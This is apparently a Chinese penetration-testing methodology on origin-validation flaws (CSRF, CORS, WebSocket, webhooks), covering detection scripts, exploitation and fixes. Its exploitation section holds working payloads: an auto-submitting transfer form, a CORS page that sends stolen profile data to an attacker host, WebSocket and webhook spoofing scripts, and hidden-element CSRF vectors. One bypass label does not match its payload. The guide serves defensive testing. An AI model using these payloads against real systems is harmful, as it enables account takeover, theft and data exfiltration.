# 来源验证攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的来源验证攻击（Origin Validation Attack）检测和利用流程。来源验证漏洞是指系统未正确验证请求的来源（Origin/Referer），可能导致 CSRF 攻击、跨域请求伪造等安全风险。

## 1.2 适用范围

本文档适用于所有存在跨域请求处理的系统，包括：
- Web 应用 CSRF 防护
- CORS 配置
- API 来源验证
- WebSocket 连接验证
- 消息队列来源验证

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

来源验证攻击针对系统未正确验证请求来源的缺陷，主要包括：

| 漏洞类型 | CWE 映射 | 描述 |
|---------|---------|------|
| 来源验证错误 | CWE-346 | 未正确验证请求来源 |
| 依赖 Referer 认证 | CWE-292 | 使用 Referer 字段进行认证 |
| 依赖反向 DNS 验证 | CWE-350 | 依赖反向 DNS 解析进行安全验证 |
| 通信通道来源验证不当 | CWE-940 | 未验证通信通道来源 |

**本质问题**：
- 未验证 Origin/Referer 头
- Origin/Referer 验证逻辑可绕过
- CORS 配置过于宽松
- 依赖客户端提供的来源信息
- 反向 DNS 验证可被欺骗

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-346 | 来源验证错误 (Origin Validation Error) |
| CWE-292 | 使用 Referer 字段进行认证 (Using Referer Field for Authentication) |
| CWE-350 | 依赖反向 DNS 解析执行安全关键操作 (Reliance on Reverse DNS Resolution) |
| CWE-940 | 通信通道来源验证不当 (Improper Verification of Source of a Communication Channel) |
| CWE-941 | 通信通道中目标指定不正确 (Incorrectly Specified Destination in a Communication Channel) |

### 来源验证漏洞风险等级

| 场景 | 风险等级 | 说明 |
|-----|---------|------|
| 无 CSRF 防护 | 高 | 完全暴露于 CSRF 攻击 |
| CORS 配置宽松 | 高 | 允许任意域访问 |
| Referer 验证可绕过 | 中 - 高 | 验证逻辑存在缺陷 |
| Origin 验证缺失 | 中 - 高 | WebSocket/API 可被滥用 |
| 反向 DNS 信任 | 中 | DNS 欺骗可绕过 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| CSRF 敏感操作 | 转账、改密、删除 | 无 CSRF Token 或验证不当 |
| CORS API | 跨域 API 访问 | Access-Control-Allow-Origin: * |
| WebSocket 连接 | 实时通信 | 未验证 Origin 头 |
| Webhook 回调 | 支付回调、通知 | 未验证回调来源 |
| OAuth 重定向 | 授权回调 | 重定向 URI 验证不当 |
| SAML/OIDC | 联邦认证 | 断言来源验证不当 |
| 消息队列 | RabbitMQ、Kafka | 未验证消息来源 |
| 微服务通信 | 服务间调用 | 未验证调用方身份 |

### 常见代码缺陷

```python
# ❌ 危险模式：无 CSRF 防护
@app.route('/transfer', methods=['POST'])
def transfer():
    # 无 CSRF Token 验证
    amount = request.form['amount']
    to_account = request.form['to_account']
    process_transfer(amount, to_account)

# ❌ 危险模式：CORS 配置过于宽松
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')  # 允许所有域
    response.headers.add('Access-Control-Allow-Credentials', 'true')
    return response

# ❌ 危险模式：Referer 验证可绕过
def verify_referer(request):
    referer = request.headers.get('Referer', '')
    # 仅检查是否包含域名，可被绕过
    if 'trusted.com' in referer:
        return True
    return False

# ❌ 危险模式：Origin 验证缺失（WebSocket）
@websocket.route('/ws')
def websocket_handler(ws):
    # 未验证 Origin
    while True:
        data = ws.receive()
        process(data)

# ✅ 正确模式：CSRF Token 验证
@app.route('/transfer', methods=['POST'])
def transfer():
    token = request.form.get('csrf_token')
    if not validate_csrf_token(token):
        abort(403)
    # 处理转账

# ✅ 正确模式：严格 CORS 配置
@app.after_request
def after_request(response):
    allowed_origins = ['https://trusted.com', 'https://app.trusted.com']
    origin = request.headers.get('Origin')
    if origin in allowed_origins:
        response.headers.add('Access-Control-Allow-Origin', origin)
    return response

# ✅ 正确模式：严格 Origin 验证（WebSocket）
@websocket.route('/ws')
def websocket_handler(ws):
    origin = ws.headers.get('Origin')
    if origin not in ALLOWED_ORIGINS:
        ws.close()
        return
    # 处理连接
```

## 2.3 漏洞发现方法

### 2.3.1 黑盒检测方法

**CSRF 漏洞检测**：

```bash
# 步骤 1：检查表单是否有 CSRF Token
curl https://target.com/transfer-form

# 检查响应中是否有 csrf_token、_token 等字段
# 如果没有，可能存在 CSRF 漏洞

# 步骤 2：尝试无 CSRF Token 的请求
curl -X POST https://target.com/transfer \
    -H "Cookie: session=valid_session" \
    -d "amount=1000&to_account=attacker_account"

# 如果请求成功，存在 CSRF 漏洞

# 步骤 3：测试 Referer/Origin 验证
curl -X POST https://target.com/transfer \
    -H "Cookie: session=valid_session" \
    -H "Referer: https://attacker.com/" \
    -H "Origin: https://attacker.com" \
    -d "amount=1000&to_account=attacker_account"

# 如果请求成功，Referer/Origin 验证缺失或可绕过
```

**CORS 配置检测**：

```bash
# 测试 CORS 配置
curl -X OPTIONS https://target.com/api/user \
    -H "Origin: https://attacker.com" \
    -H "Access-Control-Request-Method: GET" \
    -i

# 检查响应头：
# Access-Control-Allow-Origin: * 或 https://attacker.com
# Access-Control-Allow-Credentials: true
# 如果两者同时存在，存在 CORS 配置问题

# 测试多个恶意源
for origin in https://attacker.com https://evil.com https://malicious.com; do
    echo "Testing origin: $origin"
    curl -X OPTIONS https://target.com/api/user \
        -H "Origin: $origin" \
        -i 2>/dev/null | grep "Access-Control-Allow-Origin"
done
```

**WebSocket Origin 验证检测**：

```python
#!/usr/bin/env python3
"""
WebSocket Origin 验证检测脚本
"""

import websocket
import sys

def test_websocket_origin(target_ws, origin):
    """测试 WebSocket Origin 验证"""
    try:
        ws = websocket.WebSocket()
        ws.connect(target_ws, origin=origin)
        ws.send("test")
        result = ws.recv()
        ws.close()
        return True
    except Exception as e:
        return False

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else "ws://target.com/ws"
    
    # 测试不同 Origin
    origins = [
        "https://attacker.com",
        "https://evil.com",
        "null",  # 特殊测试
        ""  # 空 Origin
    ]
    
    print(f"[*] Testing WebSocket Origin validation: {target}")
    
    for origin in origins:
        result = test_websocket_origin(target, origin)
        status = "[VULNERABLE]" if result else "[SAFE]"
        print(f"{status} Origin: {origin or '(empty)'}")
```

**自动化来源验证检测脚本**：

```python
#!/usr/bin/env python3
"""
来源验证漏洞检测脚本
检测 CSRF、CORS、Origin 验证等问题
"""

import requests
from urllib.parse import urlparse

class OriginValidationScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.parsed = urlparse(target_url)
        self.base_domain = self.parsed.netloc
        self.session = requests.Session()
        self.findings = []
    
    def test_csrf_protection(self, form_url, form_data):
        """测试 CSRF 防护"""
        print(f"[*] Testing CSRF protection for {form_url}")
        
        # 获取表单（如果需要 CSRF Token）
        form_page = self.session.get(form_url)
        
        # 检查是否有 CSRF Token
        csrf_indicators = ['csrf_token', '_token', 'authenticity_token', 'csrfmiddlewaretoken']
        has_csrf_token = any(indicator in form_page.text.lower() for indicator in csrf_indicators)
        
        if not has_csrf_token:
            self.findings.append({
                'type': 'MISSING_CSRF_TOKEN',
                'severity': 'HIGH',
                'url': form_url,
                'description': 'Form does not include CSRF token'
            })
            print("[HIGH] Missing CSRF token")
        
        # 测试无 Referer/Origin 验证
        malicious_headers = {
            'Referer': 'https://attacker.com/',
            'Origin': 'https://attacker.com'
        }
        
        response = self.session.post(
            form_url,
            data=form_data,
            headers=malicious_headers
        )
        
        # 检查请求是否成功
        if response.status_code in [200, 302] and 'success' in response.text.lower():
            self.findings.append({
                'type': 'MISSING_ORIGIN_VERIFICATION',
                'severity': 'HIGH',
                'url': form_url,
                'description': 'Request accepted with malicious Origin/Referer'
            })
            print("[HIGH] Missing Origin/Referer verification")
    
    def test_cors_configuration(self, api_endpoint):
        """测试 CORS 配置"""
        print(f"[*] Testing CORS configuration for {api_endpoint}")
        
        malicious_origins = [
            'https://attacker.com',
            'https://evil.com',
            'null',
            'https://' + self.base_domain + '.attacker.com'
        ]
        
        for origin in malicious_origins:
            try:
                response = requests.options(
                    api_endpoint,
                    headers={
                        'Origin': origin,
                        'Access-Control-Request-Method': 'GET'
                    }
                )
                
                allow_origin = response.headers.get('Access-Control-Allow-Origin')
                allow_credentials = response.headers.get('Access-Control-Allow-Credentials')
                
                if allow_origin:
                    if allow_origin == '*' or origin in allow_origin:
                        if allow_credentials == 'true':
                            self.findings.append({
                                'type': 'INSECURE_CORS',
                                'severity': 'HIGH',
                                'url': api_endpoint,
                                'description': f'CORS allows origin {origin} with credentials'
                            })
                            print(f"[HIGH] Insecure CORS: {origin} with credentials")
                        elif allow_origin == '*':
                            self.findings.append({
                                'type': 'WILDCARD_CORS',
                                'severity': 'MEDIUM',
                                'url': api_endpoint,
                                'description': 'CORS allows any origin (wildcard)'
                            })
                            print(f"[MEDIUM] Wildcard CORS: {origin}")
            except Exception as e:
                pass
    
    def test_referer_bypass(self, protected_url, data):
        """测试 Referer 绕过"""
        print(f"[*] Testing Referer bypass for {protected_url}")
        
        bypass_payloads = [
            # 空 Referer
            {'Referer': ''},
            # 无 Referer
            {},
            # 恶意 Referer
            {'Referer': 'https://attacker.com/'},
            # Referer 包含目标域名（绕过检查）
            {'Referer': f'https://{self.base_domain}.attacker.com/'},
            # 使用 @ 符号绕过
            {'Referer': f'https://attacker.com@{self.base_domain}/'},
            # 使用 # 符号绕过
            {'Referer': f'https://{self.base_domain}@attacker.com/'},
            # 大小写绕过
            {'Referer': f'https://{self.base_domain.upper()}/'},
            # 添加子域名
            {'Referer': f'https://trusted.{self.base_domain}.attacker.com/'}
        ]
        
        for headers in bypass_payloads:
            try:
                response = self.session.post(
                    protected_url,
                    data=data,
                    headers=headers
                )
                
                if response.status_code in [200, 302]:
                    referer = headers.get('Referer', '(none)')
                    self.findings.append({
                        'type': 'REFERER_BYPASS',
                        'severity': 'HIGH',
                        'url': protected_url,
                        'description': f'Referer check bypassed with: {referer}'
                    })
                    print(f"[HIGH] Referer bypass: {referer}")
            except Exception as e:
                pass
    
    def test_webhook_verification(self, webhook_url):
        """测试 Webhook 来源验证"""
        print(f"[*] Testing webhook verification for {webhook_url}")
        
        # 模拟常见 Webhook 来源
        webhook_sources = [
            {'X-GitHub-Event': 'push', 'X-GitHub-Delivery': 'test123'},
            {'X-Stripe-Signature': 'test_signature'},
            {'X-PayPal-Notification-Id': 'test123'},
            {'X-Twilio-Signature': 'test_signature'}
        ]
        
        for headers in webhook_sources:
            try:
                response = requests.post(
                    webhook_url,
                    json={'test': 'data'},
                    headers=headers
                )
                
                if response.status_code == 200:
                    service = list(headers.keys())[0].split('-')[1]
                    self.findings.append({
                        'type': 'WEAK_WEBHOOK_VERIFICATION',
                        'severity': 'MEDIUM',
                        'url': webhook_url,
                        'description': f'Webhook accepts requests without proper {service} signature verification'
                    })
                    print(f"[MEDIUM] Weak webhook verification for {service}")
            except:
                pass
    
    def generate_report(self):
        """生成检测报告"""
        print("\n" + "="*60)
        print("Origin Validation Report")
        print("="*60)
        
        if not self.findings:
            print("[PASS] No origin validation issues found")
        else:
            print(f"[FAIL] Found {len(self.findings)} issue(s):\n")
            for finding in self.findings:
                print(f"Type: {finding['type']}")
                print(f"Severity: {finding['severity']}")
                print(f"URL: {finding.get('url', 'N/A')}")
                print(f"Description: {finding['description']}")
                print("-" * 40)

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 1:
        scanner = OriginValidationScanner(sys.argv[1])
        
        # 测试 CSRF
        scanner.test_csrf_protection(
            f"{sys.argv[1]}/transfer",
            {'amount': '100', 'to': 'test'}
        )
        
        # 测试 CORS
        scanner.test_cors_configuration(f"{sys.argv[1]}/api/user")
        
        # 测试 Referer 绕过
        scanner.test_referer_bypass(
            f"{sys.argv[1]}/transfer",
            {'amount': '100', 'to': 'test'}
        )
        
        # 生成报告
        scanner.generate_report()
    else:
        print("Usage: python origin_scanner.py <target_url>")
```

### 2.3.2 白盒检测方法

**代码审计要点**：

```python
# 搜索 CSRF 防护缺失
grep -r "@app.route.*POST" . | grep -v "csrf"
grep -r "methods.*POST" . | grep -v "CSRF"

# 搜索 CORS 配置
grep -r "Access-Control-Allow-Origin" .
grep -r "CORS" .

# 搜索 Referer/Origin 验证
grep -r "Referer" .
grep -r "Origin" .

# 搜索 Webhook 验证
grep -r "webhook" .
grep -r "signature" .
```

**框架配置检查**：

```bash
# Django CSRF 配置
grep -r "CsrfViewMiddleware" .
grep -r "csrf_exempt" .

# Flask CSRF 配置
grep -r "CSRFProtect" .
grep -r "csrf_token" .

# Laravel CSRF 配置
grep -r "VerifyCsrfToken" .
grep -r "@csrf" .
```

## 2.4 漏洞利用方法

### 2.4.1 CSRF 攻击利用

```html
<!-- CSRF 攻击页面 -->
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <h1>Loading...</h1>
    
    <!-- 自动提交转账表单 -->
    <form id="csrf_form" action="https://target.com/transfer" method="POST">
        <input type="hidden" name="amount" value="10000">
        <input type="hidden" name="to_account" value="ATTACKER_ACCOUNT">
        <input type="hidden" name="csrf_token" value="">
    </form>
    
    <script>
        // 自动提交表单
        document.getElementById('csrf_form').submit();
    </script>
</body>
</html>
```

```javascript
// 使用 Fetch API 进行 CSRF 攻击
fetch('https://target.com/transfer', {
    method: 'POST',
    credentials: 'include',  // 包含 Cookie
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'amount=10000&to_account=ATTACKER_ACCOUNT'
});
```

### 2.4.2 CORS 漏洞利用

```html
<!-- CORS 漏洞利用页面 -->
<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit</title>
</head>
<body>
    <script>
        // 从目标 API 窃取数据
        fetch('https://target.com/api/user/profile', {
            credentials: 'include'  // 包含 Cookie
        })
        .then(response => response.json())
        .then(data => {
            // 将数据发送到攻击者服务器
            fetch('https://attacker.com/steal', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        });
        
        // 执行敏感操作
        fetch('https://target.com/api/transfer', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                amount: 10000,
                to_account: 'ATTACKER_ACCOUNT'
            })
        });
    </script>
</body>
</html>
```

### 2.4.3 WebSocket Origin 绕过利用

```python
#!/usr/bin/env python3
"""
WebSocket Origin 绕过利用脚本
"""

import websocket
import json

class WebSocketExploiter:
    def __init__(self, ws_url, malicious_origin="https://attacker.com"):
        self.ws_url = ws_url
        self.origin = malicious_origin
        self.ws = None
    
    def connect(self):
        """连接到 WebSocket 服务器"""
        try:
            self.ws = websocket.WebSocket()
            self.ws.connect(self.ws_url, origin=self.origin)
            print(f"[+] Connected to {self.ws_url} with origin {self.origin}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def send_message(self, message):
        """发送消息"""
        if self.ws:
            self.ws.send(json.dumps(message))
            print(f"[+] Sent: {message}")
    
    def receive_messages(self, count=10):
        """接收消息"""
        messages = []
        for _ in range(count):
            try:
                msg = self.ws.recv()
                messages.append(msg)
                print(f"[+] Received: {msg}")
            except:
                break
        return messages
    
    def exploit_sensitive_action(self):
        """利用敏感操作"""
        # 示例：执行转账
        self.send_message({
            'action': 'transfer',
            'amount': 10000,
            'to_account': 'ATTACKER_ACCOUNT'
        })
        
        # 获取响应
        responses = self.receive_messages()
        return responses
    
    def close(self):
        """关闭连接"""
        if self.ws:
            self.ws.close()

if __name__ == '__main__':
    exploiter = WebSocketExploiter('ws://target.com/ws')
    
    if exploiter.connect():
        # 执行利用
        exploiter.exploit_sensitive_action()
        exploiter.close()
```

### 2.4.4 Webhook 伪造攻击

```python
#!/usr/bin/env python3
"""
Webhook 伪造攻击脚本
"""

import requests
import hmac
import hashlib
import json

class WebhookSpoofAttacker:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
    
    def spoof_github_webhook(self, event_type='push'):
        """伪造 GitHub Webhook"""
        payload = {
            'ref': 'refs/heads/main',
            'head_commit': {
                'id': 'abc123',
                'message': 'Malicious commit'
            },
            'repository': {
                'name': 'target-repo',
                'owner': {'login': 'attacker'}
            }
        }
        
        headers = {
            'Content-Type': 'application/json',
            'X-GitHub-Event': event_type,
            'X-GitHub-Delivery': 'fake-delivery-id'
            # 注意：没有 X-Hub-Signature-256
        }
        
        response = requests.post(
            self.webhook_url,
            json=payload,
            headers=headers
        )
        
        if response.status_code == 200:
            print("[SUCCESS] GitHub webhook spoofed!")
            return True
        else:
            print(f"[-] Failed: {response.status_code}")
            return False
    
    def spoof_stripe_webhook(self):
        """伪造 Stripe Webhook"""
        payload = {
            'type': 'payment_intent.succeeded',
            'data': {
                'object': {
                    'id': 'pi_fake123',
                    'amount': 10000,
                    'currency': 'usd',
                    'status': 'succeeded'
                }
            }
        }
        
        headers = {
            'Content-Type': 'application/json',
            'X-Stripe-Signature': 'fake_signature'
        }
        
        response = requests.post(
            self.webhook_url,
            json=payload,
            headers=headers
        )
        
        if response.status_code == 200:
            print("[SUCCESS] Stripe webhook spoofed!")
            return True
        else:
            print(f"[-] Failed: {response.status_code}")
            return False
    
    def spoof_generic_webhook(self, payload, headers):
        """伪造通用 Webhook"""
        response = requests.post(
            self.webhook_url,
            json=payload,
            headers=headers
        )
        
        print(f"Response: {response.status_code}")
        print(f"Body: {response.text}")
        
        return response.status_code == 200

if __name__ == '__main__':
    attacker = WebhookSpoofAttacker('https://target.com/webhook')
    
    # 尝试伪造 GitHub Webhook
    attacker.spoof_github_webhook()
    
    # 尝试伪造 Stripe Webhook
    attacker.spoof_stripe_webhook()
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过 Referer 验证

```python
# Referer 验证绕过技巧

# 1. 空 Referer
headers = {'Referer': ''}

# 2. 无 Referer 头
headers = {}  # 不发送 Referer

# 3. Referer 包含目标域名
headers = {'Referer': 'https://target.com.attacker.com/'}

# 4. 使用 @ 符号
headers = {'Referer': 'https://attacker.com@target.com/'}

# 5. 使用 # 符号
headers = {'Referer': 'https://target.com@attacker.com/'}

# 6. 大小写绕过
headers = {'Referer': 'https://TARGET.COM/'}

# 7. 添加路径绕过
headers = {'Referer': 'https://target.com.evil.com/path'}

# 8. 使用 null
headers = {'Referer': 'null'}
```

### 2.5.2 绕过 CORS 限制

```javascript
// CORS 绕过技巧

// 1. 使用子域名
// 如果验证只检查主域名
origin: 'https://trusted.attacker.com'

// 2. 使用相关域名
// 注册相似域名
origin: 'https://target-com.attacker.com'

// 3. 利用 CORS 配置错误
// 如果服务器反射 Origin
origin: 'https://target.com.evil.com'

// 4. 使用 null Origin
// 某些配置接受 null
origin: 'null'
```

### 2.5.3 隐蔽攻击

```html
<!-- 隐蔽的 CSRF 攻击 -->
<img src="https://target.com/transfer?amount=10000&to=attacker" 
     style="display:none" 
     onerror="this.src='https://target.com/transfer?amount=10000&to=attacker2'">

<!-- 使用 iframe -->
<iframe src="https://target.com/transfer?amount=10000&to=attacker" 
        style="display:none"></iframe>

<!-- 使用 SVG -->
<svg onload="fetch('https://target.com/transfer', {method:'POST', credentials:'include'})">
```

---

# 第三部分：附录

## 3.1 来源验证检查清单

| 检查项 | 测试方法 | 安全要求 |
|-------|---------|---------|
| CSRF Token | 检查表单和请求 | 所有状态变更请求应有 CSRF Token |
| Referer 验证 | 测试恶意 Referer | 应严格验证 Referer 域名 |
| Origin 验证 | 测试恶意 Origin | 应验证 Origin 在白名单中 |
| CORS 配置 | 测试恶意源 | 不应使用通配符，应限制具体域名 |
| WebSocket Origin | 测试不同 Origin | 应验证 WebSocket 连接 Origin |
| Webhook 签名 | 测试伪造签名 | 应验证 Webhook 签名 |

## 3.2 常用工具

| 工具 | 用途 | 命令示例 |
|-----|------|---------|
| Burp Suite | CSRF 测试 | 生成 CSRF PoC |
| curl | 手动测试 | `curl -H "Origin: https://attacker.com"` |
| CSRF PoC Generator | 生成 CSRF 页面 | Burp 内置 |
| websocket-client | WebSocket 测试 | Python 库 |
| CORS Scanner | CORS 测试 | 在线工具或自定义脚本 |

## 3.3 修复建议

### CSRF 防护修复

```python
# Flask CSRF 防护
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'
csrf = CSRFProtect(app)

# 所有表单自动包含 CSRF Token
# 所有 POST 请求自动验证 CSRF Token

# Django CSRF 防护
# 默认启用 CsrfViewMiddleware
# 模板中自动包含 {% csrf_token %}

# Laravel CSRF 防护
# VerifyCsrfToken 中间件默认启用
#  Blade 模板中自动包含 @csrf
```

### CORS 修复

```python
# Flask CORS 修复
from flask_cors import CORS

# 限制具体域名
CORS(app, resources={
    r"/api/*": {
        "origins": ["https://trusted.com", "https://app.trusted.com"],
        "supports_credentials": True
    }
})

# 或使用 after_request 手动控制
@app.after_request
def after_request(response):
    allowed_origins = ['https://trusted.com']
    origin = request.headers.get('Origin')
    if origin in allowed_origins:
        response.headers.add('Access-Control-Allow-Origin', origin)
        response.headers.add('Access-Control-Allow-Credentials', 'true')
    return response
```

### WebSocket Origin 验证修复

```python
# Flask-SocketIO Origin 验证
from flask_socketio import SocketIO

socketio = SocketIO(
    app,
    cors_allowed_origins=["https://trusted.com", "https://app.trusted.com"]
)

# 或手动验证
@socketio.on('connect')
def connect():
    origin = request.headers.get('Origin')
    if origin not in ALLOWED_ORIGINS:
        return False
    return True
```

### Webhook 签名验证修复

```python
# GitHub Webhook 签名验证
import hmac
import hashlib

def verify_github_signature(payload, signature, secret):
    expected = 'sha256=' + hmac.new(
        secret.encode(),
        payload,
        hashlib.sha256
    ).hexdigest()
    return hmac.compare_digest(expected, signature)

# Stripe Webhook 签名验证
import stripe

def verify_stripe_signature(payload, signature, secret):
    try:
        event = stripe.Webhook.construct_event(
            payload, signature, secret
        )
        return True
    except:
        return False
```

## 3.4 参考资源

- [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP CORS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html)
- [PortSwigger CSRF Vulnerabilities](https://portswigger.net/web-security/csrf)
